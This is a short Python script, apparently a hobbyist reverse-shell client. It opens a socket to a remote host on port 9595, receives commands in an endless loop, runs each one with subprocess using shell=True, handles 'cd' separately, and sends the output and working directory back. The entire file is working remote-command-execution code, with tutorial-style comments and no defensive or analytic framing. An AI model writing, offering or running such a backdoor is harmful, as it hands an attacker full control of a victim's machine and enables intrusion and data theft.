import socket
import os
import subprocess

s = socket.socket()

host = "Ip of client"
port = 9595
s.connect((host,port))

while True:
    data = s.recv(1024) #Receive the data from server in the format of byte
    if data[:2].decode("utf-8") == "cd": #check if the first two character is cd or not
        os.chdir(data[3:].decode("utf-8")) #if 1st charater is cd then it will change the directory
    if len(data)>0: #if you press any other commands
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() #if any wierd commands are put then it will show an error and will store in that variable as a byte format
        output_str = str(output_byte,"utf-8") #contvert the byte format into string
        currentWD = os.getcwd() + "> " #Get the current working directory
        s.send(str.encode(output_str + currentWD)) #send to the server
        print(output_str)